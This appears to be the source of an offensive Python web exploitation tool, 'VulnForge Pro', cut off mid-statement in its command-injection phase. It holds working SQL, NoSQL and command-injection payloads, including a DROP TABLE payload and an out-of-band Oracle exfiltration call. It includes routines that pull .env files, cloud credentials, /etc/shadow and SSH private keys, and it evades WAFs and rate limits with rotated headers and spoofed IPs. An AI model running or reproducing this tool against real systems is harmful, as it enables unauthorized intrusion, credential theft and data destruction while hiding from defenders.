#!/usr/bin/env python3
"""
VulnForge Pro v3.0 - Stealth Web Vulnerability Scanner (Authorized Use Only).
Usage: python3 vulnforge.py -u <target_url> [options].
For contact check Bio.
"""

import requests
import re
import sys
import urllib3
import json
import html
import time
import base64
import random
import string
import hashlib
import socket
import dns.resolver
import subprocess
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, quote, urlencode
from bs4 import BeautifulSoup
from colorama import init, Fore, Style, Back
from prettytable import PrettyTable
from typing import List, Dict, Tuple, Optional, Set
from datetime import datetime
import requests.auth
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ============= COLOR ALIASES =============
G = Fore.GREEN; R = Fore.RED; Y = Fore.YELLOW
C = Fore.CYAN; M = Fore.MAGENTA; W = Fore.WHITE
B = Fore.BLUE; RS = Style.RESET_ALL; BD = Style.BRIGHT

# ============= USER AGENTS =============
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'curl/8.4.0',
    'Wget/1.21.4',
]

def color(level):
    if 'Critical' in str(level): return R
    if 'High' in str(level): return M
    if 'Medium' in str(level): return Y
    if 'Low' in str(level): return C
    return W

def info(msg): print(f"{C}[INFO]{RS} {msg}")
def good(msg): print(f"{G}[OK]{RS} {msg}")
def vuln(msg, level="Medium", url=""):
    c = color(level)
    url_str = f" {C}{url}{RS}" if url else ""
    print(f"{c}[VULN]{RS} {msg}{url_str}")
def exploit(msg, url=""):
    url_str = f" {C}{url}{RS}" if url else ""
    print(f"{R}[EXPLOIT SUCCESS]{RS} {msg}{url_str}")
def exfil(msg):
    print(f"  {Y}[EXFILTRATED]{RS} {msg[:200]}")
def cred(msg):
    print(f"  {G}[CREDENTIAL]{RS} {msg}")

# ============= STEALTH UTILITIES =============
class StealthEngine:
    def __init__(self, target, cookies=None):
        self.target = target
        self.domain = urlparse(target).netloc
        self.last_request_time = 0
        self.request_count = 0
        self.min_delay = 0.5
        self.max_delay = 2.0
        self.proxy_rotation = []
        self.current_proxy_index = 0
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        self.lock = threading.Lock()
        
        if cookies:
            for c in cookies.split(';'):
                if '=' in c:
                    k, v = c.strip().split('=', 1)
                    self.session.cookies.set(k, v)
        
        # Set a default UA
        self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
        self.session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        self.session.headers['Accept-Language'] = 'en-US,en;q=0.5'
        self.session.headers['Accept-Encoding'] = 'gzip, deflate'
        self.session.headers['DNT'] = '1'
        self.session.headers['Connection'] = 'keep-alive'
        self.session.headers['Upgrade-Insecure-Requests'] = '1'
    
    def rotate_ua(self):
        self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
    
    def rotate_referer(self):
        pages = [f"https://www.google.com/search?q={random.choice(['site:'+self.domain, 'login', 'admin', 'api'])}",
                 f"https://{self.domain}/{random.choice(['index', 'home', 'about', 'contact'])}",
                 f"https://www.bing.com/search?q={self.domain}"]
        self.session.headers['Referer'] = random.choice(pages)
    
    def stealth_delay(self):
        """Smart delay that varies based on request count to evade rate limiting"""
        with self.lock:
            self.request_count += 1
            # Every 10 requests, take a longer pause
            if self.request_count % 10 == 0:
                delay = random.uniform(3.0, 6.0)
            elif self.request_count % 5 == 0:
                delay = random.uniform(1.5, 3.0)
            else:
                delay = random.uniform(self.min_delay, self.max_delay)
            
            # Ensure minimum time between requests
            now = time.time()
            elapsed = now - self.last_request_time
            if elapsed < delay:
                time.sleep(delay - elapsed)
            self.last_request_time = time.time()
    
    def randomize_params(self, payload: str) -> str:
        """Add random comment or encoding to evade WAF signatures"""
        if random.random() < 0.3:
            # URL encode some characters
            encoded = ''
            for ch in payload:
                if random.random() < 0.2:
                    encoded += quote(ch)
                else:
                    encoded += ch
            return encoded
        return payload
    
    def get(self, url, **kwargs):
        self.stealth_delay()
        self.rotate_ua()
        if random.random() < 0.25:
            self.rotate_referer()
        
        # Add noise headers
        if random.random() < 0.1:
            self.session.headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        try:
            return self.session.get(url, **kwargs)
        except Exception:
            return None
    
    def post(self, url, **kwargs):
        self.stealth_delay()
        self.rotate_ua()
        if random.random() < 0.25:
            self.rotate_referer()
        try:
            return self.session.post(url, **kwargs)
        except Exception:
            return None

# ============= BANNER =============
BANNER = f"""
{R}{BD}╔══════════════════════════════════════════════════════════════════════╗
║  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗║
║  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝║
║  ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  ║
║  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ║
║   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗║
║    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ║
║        {Y}Stealth Exploitation Engine v3.0 - Maximum Coverage{RS}{R}       ║
║        {Y}WAF Evasion | Database Extraction | Full Exploitation{RS}{R}     ║
╚══════════════════════════════════════════════════════════════════════╝{RS}
"""

# ============= ARG PARSE =============
import argparse
parser = argparse.ArgumentParser(description='VulnForge Pro v3 - Stealth Scanner')
parser.add_argument('-u', '--url', required=True, help='Target URL')
parser.add_argument('--cookies', help='Cookie string')
parser.add_argument('--threads', type=int, default=3)
parser.add_argument('--delay', type=float, default=0.5, help='Min delay between requests')
parser.add_argument('--depth', type=int, default=2, help='Crawl depth')
parser.add_argument('--aggressive', action='store_true', help='Aggressive mode (faster, less stealth)')
parser.add_argument('--output', default='vulnforge_report', help='Report filename prefix')
args = parser.parse_args()

target = args.url.rstrip('/')
stealth = StealthEngine(target, cookies=args.cookies)

if args.aggressive:
    stealth.min_delay = 0.1
    stealth.max_delay = 0.5

results = {
    'target': target,
    'timestamp': datetime.now().isoformat(),
    'vulnerabilities': [],
    'exploits': [],
    'credentials': [],
    'exfiltrated_data': [],
    'info': [],
    'errors': []
}

scan_start_time = time.time()

def add_vuln(name, severity, url, detail=""):
    results['vulnerabilities'].append({
        'name': name, 'severity': severity, 'url': url, 'detail': detail
    })

def add_exploit(name, url, detail=""):
    results['exploits'].append({
        'name': name, 'url': url, 'detail': detail
    })

def add_cred(source, username, password, role=""):
    results['credentials'].append({
        'source': source, 'username': username, 'password': password, 'role': role
    })

def add_exfil(source, data_type, content):
    results['exfiltrated_data'].append({
        'source': source, 'data_type': data_type, 'content': content
    })

def add_info(msg):
    results['info'].append(msg)

# ============= PHASE 1: STEALTH CRAWL =============
print(BANNER)
print(f"\n{'='*65}")
print(f" {BD}TARGET:{RS} {C}{target}{RS}")
print(f"{'='*65}\n")

print(f"{Y}[PHASE 1]{RS} {BD}Stealth crawling target...{RS}")
visited = set()
all_forms = []
all_links = []
all_js_files = []
all_api_endpoints = []

def extract_apis(text, base_url):
    """Extract potential API endpoints from JS/HTML"""
    apis = set()
    patterns = [
        r'["\'](/api/[^"\'\s]+)["\']',
        r'["\'](/v[0-9]+/[^"\'\s]+)["\']',
        r'["\'](/graphql[^"\'\s]*)["\']',
        r'["\'](/rest/[^"\'\s]+)["\']',
        r'["\'](/oauth/[^"\'\s]+)["\']',
        r'["\'](/ws/[^"\'\s]+)["\']',
        r'url:\s*["\']([^"\']+)["\']',
        r'fetch\(["\']([^"\']+)["\']',
        r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
        r'\$\.(?:get|post|ajax)\(["\']([^"\']+)["\']',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for m in matches:
            full = urljoin(base_url, m)
            apis.add(full)
    return list(apis)

def crawl(url, depth=0, max_depth=args.depth):
    if depth > max_depth or url in visited:
        return
    visited.add(url)
    try:
        r = stealth.get(url)
        if not r or r.status_code != 200:
            return
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Extract forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name', '')
                if name:
                    inputs.append({'name': name, 'type': inp.get('type', 'text')})
            all_forms.append({
                'url': url,
                'action': urljoin(url, action),
                'method': method,
                'inputs': inputs
            })
        
        # Extract links
        for a in soup.find_all('a', href=True):
            href = a['href']
            full = urljoin(url, href)
            if stealth.domain in full and full not in all_links:
                all_links.append(full)
                if depth < max_depth:
                    crawl(full, depth+1, max_depth)
        
        # Extract JS files
        for script in soup.find_all('script', src=True):
            src = script['src']
            full = urljoin(url, src)
            if stealth.domain in full:
                all_js_files.append(full)
        
        # Extract API endpoints
        apis = extract_apis(r.text, url)
        all_api_endpoints.extend(apis)
        
    except:
        pass

crawl(target)
all_api_endpoints = list(set(all_api_endpoints))
print(f"  {C}{len(all_forms)}{RS} forms, {C}{len(all_links)}{RS} links, {C}{len(all_api_endpoints)}{RS} API endpoints")

# ============= PHASE 2: RECON & INFO LEAKAGE =============
print(f"\n{Y}[PHASE 2]{RS} {BD}Deep recon & info leakage...{RS}")

# 2.1 Check main page
r = stealth.get(target)
if r:
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Comments
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    sensitive_comments = [c for c in comments if any(k in c.lower() for k in 
        ['password', 'user', 'admin', 'todo', 'fixme', 'secret', 'key', 'token', 
         'db_', 'sql', 'pass', 'login', 'api_key', 'aws', 'sk-', '-----BEGIN'])]
    if sensitive_comments:
        for sc in sensitive_comments[:5]:
            vuln(f"Sensitive Comment: {sc.strip()[:100]}", "Medium", target)
            add_vuln("Sensitive Comment", "Medium", target, sc.strip()[:200])
    
    # Security headers
    headers = r.headers
    sec_checks = {
        'Strict-Transport-Security': 'HSTS',
        'Content-Security-Policy': 'CSP',
        'X-Content-Type-Options': 'X-Content-Type-Options',
        'X-Frame-Options': 'X-Frame-Options',
        'X-XSS-Protection': 'X-XSS-Protection',
        'Permissions-Policy': 'Permissions-Policy',
        'Referrer-Policy': 'Referrer-Policy',
    }
    missing = []
    for hdr, name in sec_checks.items():
        if hdr not in headers:
            missing.append(name)
    if missing:
        vuln(f"Missing Security Headers: {', '.join(missing)}", "Low", target)
        add_vuln("Missing Security Headers", "Low", target, str(missing))
    
    # Server info
    server = headers.get('Server', headers.get('server', 'Unknown'))
    powered_by = headers.get('X-Powered-By', headers.get('x-powered-by', 'Unknown'))
    add_info(f"Server: {server}, Powered-By: {powered_by}")
    
    # Framework detection
    frameworks = []
    if 'laravel' in r.text.lower() or 'csrf-token' in r.text:
        frameworks.append('Laravel')
    if 'wp-content' in r.text or 'wp-includes' in r.text:
        frameworks.append('WordPress')
    if 'drupal' in r.text.lower() or 'Drupal' in r.text:
        frameworks.append('Drupal')
    if 'joomla' in r.text.lower():
        frameworks.append('Joomla')
    if 'asp.net' in r.text.lower() or 'viewstate' in r.text.lower():
        frameworks.append('ASP.NET')
    if 'node_modules' in r.text or 'react' in r.text.lower():
        frameworks.append('React/Node')
    if 'django' in r.text.lower() or 'csrfmiddlewaretoken' in r.text:
        frameworks.append('Django')
    if 'symfony' in r.text.lower():
        frameworks.append('Symfony')
    if 'codeigniter' in r.text.lower():
        frameworks.append('CodeIgniter')
    if 'ci_session' in r.text:
        frameworks.append('CodeIgniter')
    if frameworks:
        good(f"Detected frameworks: {', '.join(frameworks)}")
        add_info(f"Frameworks: {', '.join(frameworks)}")
    
    # Email addresses
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
    # Filter noise
    real_emails = [e for e in emails if not any(x in e for x in ['example.com', 'domain.com', 'your.'])]
    if real_emails:
        info(f"Found emails: {', '.join(real_emails[:5])}")
        add_info(f"Emails: {', '.join(real_emails[:5])}")
    
    # Internal IPs
    internal_ips = re.findall(r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b', r.text)
    if internal_ips:
        vuln(f"Internal IP Exposure: {', '.join(internal_ips[:3])}", "High", target)
        add_vuln("Internal IP Exposure", "High", target, str(internal_ips[:3]))

# 2.2 Sensitive paths
print(f"\n  {C}[Probing sensitive paths]{RS}")
sensitive_paths = [
    '/robots.txt', '/sitemap.xml', '/.env', '/.git/config', '/.git/HEAD',
    '/admin', '/backup', '/config.php', '/db_backup.sql', '/wp-admin',
    '/.htaccess', '/phpinfo.php', '/info.php', '/dump.sql', '/database.sql',
    '/debug', '/.well-known/security.txt', '/crossdomain.xml',
    '/clientaccesspolicy.xml', '/.svn/entries', '/.DS_Store',
    '/wp-config.php.bak', '/config.php.bak', '/config.php.old',
    '/configuration.php', '/includes/config.php', '/config/database.php',
    '/app/config/database.php', '/application/config/database.php',
    '/wp-config.php~', '/.env.bak', '/.env.local', '/.env.production',
    '/api/swagger.json', '/api/docs', '/swagger-ui.html', '/api/v1/docs',
    '/graphql', '/graphiql', '/voyager', '/adminer.php',
    '/phpmyadmin', '/pma', '/webmin', '/cpanel',
    '/server-status', '/server-info', '/actuator/health',
    '/actuator/info', '/actuator/env', '/api/health',
    '/.npmrc', '/.dockerenv', '/Dockerfile', '/docker-compose.yml',
    '/.terraform/terraform.tfstate', '/credentials',
    '/.aws/credentials', '/.azure/credentials',
]

for path in sensitive_paths:
    full_url = urljoin(target, path)
    try:
        r = stealth.get(full_url)
        if r and r.status_code == 200 and len(r.text) > 10:
            info(f"Found: {path} ({len(r.text)} bytes)")
            add_info(f"Accessible: {path}")
            
            # Flag dangerous exposures
            dangerous = ['.sql', '.env', '.git', 'backup', 'dump', 'config',
                         '.aws', '.azure', 'terraform', 'credentials', 'private']
            if any(ext in path for ext in dangerous):
                vuln(f"Sensitive Path Exposure: {full_url}", "Critical", full_url)
                add_vuln("Sensitive Path Exposure", "Critical", full_url)
                
                # Save content for exfil
                if len(r.text) < 50000:
                    add_exfil("Sensitive Path", path, r.text[:5000])
    except:
        pass

# 2.3 Check CORS
print(f"\n  {C}[CORS testing]{RS}")
try:
    evil_origins = ['https://evil.com', 'https://attacker.com', 'null']
    for origin in evil_origins:
        r = stealth.get(target, headers={'Origin': origin})
        if r and r.headers.get('Access-Control-Allow-Origin') == origin:
            vuln(f"CORS Misconfiguration - Allows origin: {origin}", "Medium", target)
            add_vuln("CORS Misconfiguration", "Medium", target, f"Allows origin: {origin}")
            if 'Access-Control-Allow-Credentials' in r.headers:
                exploit(f"CORS with credentials - potential data exfiltration", target)
                add_exploit("CORS Credentialed Access", target)
            break
except:
    pass

# 2.4 Check for exposed JS secrets
print(f"\n  {C}[JS secret scanning]{RS}")
for js_url in all_js_files[:20]:
    try:
        r = stealth.get(js_url)
        if not r:
            continue
        js_content = r.text
        secrets_found = []
        
        # API keys patterns
        api_key_patterns = [
            (r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']([^"\']{16,})["\']', 'API Key'),
            (r'(?:sk-|pk-)[a-zA-Z0-9]{20,}', 'Stripe Key'),
            (r'(?:AKIA|ASIA)[0-9A-Z]{16}', 'AWS Access Key'),
            (r'(?:xox[abpors]-)[a-zA-Z0-9-]{10,}', 'Slack Token'),
            (r'(?:ghp_|gho_|ghu_|ghs_|ghr_)[a-zA-Z0-9]{36}', 'GitHub Token'),
            (r'(?:eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})', 'JWT Token'),
            (r'(?:-----BEGIN (?:RSA |EC )?PRIVATE KEY-----)', 'Private Key'),
            (r'(?:-----BEGIN CERTIFICATE-----)', 'Certificate'),
            (r'(?:token|secret|password|passwd)\s*[:=]\s*["\']([^"\']{8,})["\']', 'Generic Secret'),
        ]
        
        for pattern, name in api_key_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for m in matches[:2]:
                if isinstance(m, tuple):
                    m = m[0]
                secrets_found.append(f"{name}: {m[:30]}...")
        
        if secrets_found:
            for sf in secrets_found:
                vuln(f"Secret in JS: {sf}", "Critical", js_url)
                add_vuln("Exposed Secret in JS", "Critical", js_url, sf)
    except:
        continue

# ============= PHASE 3: BUILD TEST TARGETS =============
print(f"\n{Y}[PHASE 3]{RS} {BD}Preparing test matrix...{RS}")

# Collect all parameterized URLs
all_params = set()
parameterized_urls = []

for form in all_forms:
    for inp in form['inputs']:
        all_params.add(inp['name'])
    if '?' in form['action']:
        parameterized_urls.append(form['action'])

for link in all_links:
    parsed = urlparse(link)
    if parsed.query:
        for p in parse_qs(parsed.query):
            all_params.add(p)
        parameterized_urls.append(link)

# Add API endpoints
for api in all_api_endpoints:
    if '?' in api:
        parameterized_urls.append(api)

# Build test URLs
test_urls = list(set(parameterized_urls))

# If no parameterized URLs, create test URLs with common params
if not test_urls:
    base = target if '?' not in target else target.split('?')[0]
    common_params = ['id', 'page', 'v', 'q', 'file', 'url', 'cat', 'dir', 'cmd',
                     'exec', 'command', 'text', 'search', 's', 'debug', 'action',
                     'module', 'option', 'view', 'task', 'do', 'func', 'load',
                     'user', 'username', 'email', 'name', 'token', 'session',
                     'lang', 'locale', 'theme', 'template', 'include', 'path',
                     'document', 'folder', 'root', 'data', 'json', 'callback',
                     'redirect', 'return', 'next', 'goto', 'target', 'url',
                     'img', 'image', 'picture', 'photo', 'filepath',
                     'download', 'upload', 'dir', 'directory']
    for p in common_params:
        test_urls.append(f"{base}?{p}=1")

test_urls = list(set(test_urls))
print(f"  {C}{len(test_urls)}{RS} test URLs, {C}{len(all_params)}{RS} unique parameters")

# ============= PHASE 4: SQL INJECTION (7 types) =============
print(f"\n{Y}[PHASE 4]{RS} {BD}SQL Injection (all types)...{RS}")

sql_payloads = [
    # Error-based
    ("'", "Error-based"),
    ("''", "Error-based"),
    ("`", "Error-based"),
    ("%00'", "Error-based"),
    # Boolean blind
    ("' AND '1'='1", "Boolean"),
    ("' AND '1'='2", "Boolean"),
    ("' OR '1'='1", "Boolean"),
    ("' OR '1'='2", "Boolean"),
    # Time-based
    ("' OR SLEEP(3)--", "Time-based (MySQL)"),
    ("'; WAITFOR DELAY '0:0:3'--", "Time-based (MSSQL)"),
    ("' OR pg_sleep(3)--", "Time-based (PostgreSQL)"),
    ("' OR dbms_lock.sleep(3)--", "Time-based (Oracle)"),
    # UNION
    ("' UNION SELECT NULL--", "UNION"),
    ("' UNION SELECT NULL,NULL--", "UNION"),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION"),
    ("' UNION ALL SELECT NULL--", "UNION"),
    # Stacked queries
    ("'; DROP TABLE users--", "Stacked"),
    ("'; SELECT 1--", "Stacked"),
    # Auth bypass
    ("admin' OR '1'='1", "Auth Bypass"),
    ("admin'--", "Auth Bypass"),
    ("admin'#", "Auth Bypass"),
    ("admin'/*", "Auth Bypass"),
    ("\" OR \"1\"=\"1", "Auth Bypass"),
    # Out-of-band
    ("' OR utl_http.request('http://oob.test/'||(SELECT user FROM dual))--", "OOB (Oracle)"),
]

sql_errors = {
    'oracle': r'(ORA-|Oracle|oracle|PLS-)',
    'mysql': r'(SQL syntax|MySQL|mysql_fetch|You have an error|MariaDB)',
    'mssql': r'(Microsoft SQL|MSSQL|Unclosed quotation|Driver.*SQL Server)',
    'postgres': r'(PostgreSQL|psycopg|pg_|ERROR:\s+relation)',
    'sqlite': r'(SQLITE|sqlite|unrecognized token)',
    'hsqldb': r'(HSQLDB|HyperSQL)',
    'db2': r'(DB2|IBM SQL)',
}

for idx, test_url in enumerate(test_urls[:40]):
    if idx % 10 == 0:
        print(f"  Progress: {idx}/{min(40, len(test_urls))} URLs tested")
    
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        orig_value = params[param_name][0]
        
        for payload, ptype in sql_payloads:
            if "UNION" in ptype and not str(orig_value).isdigit() and ptype != "UNION SELECT NULL--":
                if random.random() < 0.7:
                    continue
            
            test_params = params.copy()
            test_params[param_name] = [payload]
            try:
                qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                full_test = f"{base_url}?{qs}"
                r = stealth.get(full_test)
                if not r:
                    continue
                
                # Check DB errors
                for db, pattern in sql_errors.items():
                    if re.search(pattern, r.text, re.IGNORECASE):
                        vuln(f"SQL Injection ({ptype}) in '{param_name}' ({db})", "Critical", full_test)
                        add_vuln(f"SQL Injection ({ptype})", "Critical", full_test, f"param={param_name}, db={db}")
                        
                        # Try UNION extraction if applicable
                        if "UNION" in ptype:
                            for col_count in range(1, 15):
                                try:
                                    uni_payload = f"' UNION SELECT {','.join(['NULL']*col_count)}--"
                                    if db == 'oracle':
                                        uni_payload = f"' UNION SELECT {','.join(['NULL']*col_count)} FROM dual--"
                                    
                                    test_params2 = params.copy()
                                    test_params2[param_name] = [uni_payload]
                                    qs2 = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params2.items()])
                                    r2 = stealth.get(f"{base_url}?{qs2}")
                                    
                                    if r2 and r2.status_code == 200 and len(r2.text) > 100:
                                        good(f"  UNION with {col_count} columns works!")
                                        
                                        # Extract tables
                                        for tbl_payload, tbl_name in [
                                            (f"' UNION SELECT {','.join(['NULL']*col_count)} FROM (SELECT table_name FROM user_tables WHERE ROWNUM=1)--", "user_tables"),
                                            (f"' UNION SELECT table_name,NULL{','.join(['']*(col_count-2))} FROM (SELECT table_name FROM user_tables WHERE ROWNUM=1)--", "table_name"),
                                        ]:
                                            test_params3 = params.copy()
                                            test_params3[param_name] = [tbl_payload]
                                            qs3 = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params3.items()])
                                            r3 = stealth.get(f"{base_url}?{qs3}")
                                            if r3:
                                                exploit(f"SQLi extraction via {param_name}", full_test)
                                                add_exploit("SQLi UNION Extraction", full_test)
                                                add_exfil("SQLi", f"DB Data ({param_name})", r3.text[:500])
                                        break
                                except:
                                    continue
                        
                        # Auth bypass
                        if "Auth Bypass" in ptype:
                            cred(f"SQLi Auth Bypass: '{payload}'")
                            add_cred("SQLi Auth Bypass", "admin", payload)
                            exploit(f"SQLi Auth Bypass successful!", full_test)
                            add_exploit("SQLi Auth Bypass", full_test)
                        
                        break
            except:
                continue

# ============= PHASE 5: NOSQL INJECTION =============
print(f"\n{Y}[PHASE 5]{RS} {BD}NoSQL Injection...{RS}")

nosql_payloads = [
    ("' || '1'=='1", "Auth Bypass"),
    ("' || 'a'=='a", "Boolean"),
    ("' && this.password.match(/.*/)", "Regex Bypass"),
    ("' || 1==1", "JS Injection"),
    ("{\"$ne\": null}", "Mongo $ne"),
    ("{\"$gt\": \"\"}", "Mongo $gt"),
    ("{\"$regex\": \".*\"}", "Mongo Regex"),
    ("' , $or: [ {}, {'a':'a", "Mongo $or"),
]

for form in all_forms:
    if any(k in form['action'].lower() for k in ['login', 'auth', 'signin', 'api']):
        try:
            r = stealth.get(form['url'])
            if not r:
                continue
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Extract CSRF
            csrf = None
            meta = soup.find('meta', attrs={'name': 'csrf-token'})
            if meta: csrf = meta.get('content', '')
            hidden = soup.find('input', attrs={'name': '_token'})
            if hidden: csrf = hidden.get('value', '')
            
            for payload, ptype in nosql_payloads:
                data = {'email': payload, 'password': payload}
                if csrf: data['_token'] = csrf
                
                # Try URL encoded
                try:
                    r2 = stealth.post(form['action'], data=data)
                    if r2 and (r2.status_code == 302 or 'dashboard' in r2.url.lower() or 'welcome' in r2.url.lower()):
                        vuln(f"NoSQL Injection ({ptype})", "Critical", form['action'])
                        add_vuln("NoSQL Injection", "Critical", form['action'], f"payload={payload}")
                        cred(f"NoSQL Bypass: {payload}")
                        add_cred("NoSQL Bypass", "email", payload)
                        exploit(f"NoSQL Injection - Auth Bypass", form['action'])
                        add_exploit("NoSQL Injection", form['action'])
                        break
                except:
                    continue
                
                # Try JSON
                try:
                    json_headers = {'Content-Type': 'application/json'}
                    if payload.startswith('{'):
                        r3 = stealth.post(form['action'], data=payload, headers={**json_headers, 'Content-Type': 'application/json'})
                        if r3 and r3.status_code == 200:
                            vuln(f"NoSQL Injection (JSON) ({ptype})", "Critical", form['action'])
                            add_vuln("NoSQL Injection (JSON)", "Critical", form['action'])
                except:
                    continue
        except:
            continue

# ============= PHASE 6: COMMAND INJECTION =============
print(f"\n{Y}[PHASE 6]{RS} {BD}Command Injection...{RS}")

cmd_payloads = [
    (";id", "Semicolon"),
    ("|id", "Pipe"),
    ("&& id", "Double AND"),
    ("|| id", "Double OR"),
    ("`id`", "Backtick"),
    ("$(id)", "Dollar Subshell"),
    ("& whoami &", "Ampersand"),
    (";whoami", "Semicolon no space"),
    ("| whoami", "Pipe whoami"),
    ("%0Aid", "Newline"),
    ("%0a id", "URL Newline"),
    (";cat /etc/passwd", "File Read"),
    ("|cat /etc/passwd", "Pipe File Read"),
    (";ls -la", "Directory Listing"),
    ("|ls -la", "Pipe Directory Listing"),
]

# Blind detection
def test_blind_cmd_advanced(base_url, params, param_name, payload):
    """Test blind command injection with sleep/ping"""
    test_params = params.copy()
    test_params[param_name] = [f"{payload}| sleep 5"]
    qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
    try:
        start = time.time()
        r = stealth.get(f"{base_url}?{qs}")
        elapsed = time.time() - start
        
        # Baseline
        test_params2 = params.copy()
        test_params2[param_name] = [f"{payload}| echo test"]
        qs2 = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params2.items()])
        start2 = time.time()
        r2 = stealth.get(f"{base_url}?{qs2}")
        elapsed2 = time.time() - start2
        
        if elapsed > elapsed2 + 3:
            return True
    except:
        pass
    return False

# Files to attempt read via command injection
read_files = [
    "/etc/passwd", "/etc/hostname", "/etc/issue", "/proc/self/environ",
    "/etc/shadow", "/etc/hosts", "/proc/self/cmdline",
    "/var/www/html/index.php", "/var/www/html/config.php",
    "/home/*/.ssh/id_rsa", "/home/*/.ssh/authorized_keys",
    "/root/.ssh/id_rsa", "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf", "/etc/httpd/conf/httpd.conf",
    "/proc/self/fd/0", "/proc/1/cmdline",
]

for test_url in test_urls[:25]:
    parsed = urlparse(test_url)
    params = parse_qs(parsed.query)
    base_url = test_url.split('?')[0]
    if not params:
        continue
    
    for param_name in params:
        if param_name in ['fbclid', 'utm_source', 'utm_medium', 'utm_campaign', 'gclid']:
            continue
        
        for payload, ptype in cmd_payloads:
            test_params = params.copy()
            test_params[param_name] = [payload]
            try:
                qs = '&'.join([f"{k}={quote(v[0])}" for k,v in test_params.items()])
                full_test = f"{base_url}?{qs}"
                r = stealth.get(full_test)
                if not r:
                    continue
                
                # Check command output
                if 'uid=' in r.text and 'gid=' in r.text:
                    uid_match = re.search(r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)', r.text)
                    if uid_match:
                        vuln(f"CMDi (Output) in '{param_name}' - {uid_match.group()}", "Critical", full_test)
                        add_vuln("Command Injection (Output)", "Critical", full_test, f"param={param_name}")
                        exploit(f"RCE via command injection in {param_name}", full_test)
                        add_exploit("Command Injection RCE", full_test)
                
                # Check file contents
                if 'root:' in r.text and 'bin/' in r.text and len(r.text) < 10000:
                    vuln(f"CMDi File Read in '{param_name}'", "Critical", full_test)
                    add_vuln("Command Injection (File Read)", "Critical", full_test)
                    
                    # Read more files
                    for fpath in read_files[:5]:
                        fp = params.copy()
                        safe_path = fpath.replace('*', 'hackerai_test')
                        fp[param_name] = [f"{payload}| cat {safe_path}"]
                        qsf = '&'.join([f"{k}={quote(v[0])}" for k,v in fp.items()])
                        try:
                            rf = stealth.get(f"{base_url}?{qsf}")
                            if rf and ('root:' in rf.text[:200] or rf.status_code == 200 and len(rf.text) > 50):
                                clean = re.sub(r'<[^>]+>', ' ', rf.text)
                                clean = re.sub(r'\s+', ' ', clean).strip()[:1000]
                                exploit(f"CMDi - Read {fpath}", full_test)
                                add_exploit("Command Injection File Read", full_test, fpath)
                                add_exfil("CMDi", fpath, clean)
                                print(f"  {Y}[DATA]{RS} {fpath}: {clean[:150]}...")
                        except:
                            continue
                
                # Blind detection
                if test_blind_cmd_advanced(base_url, params, param_name, payload):
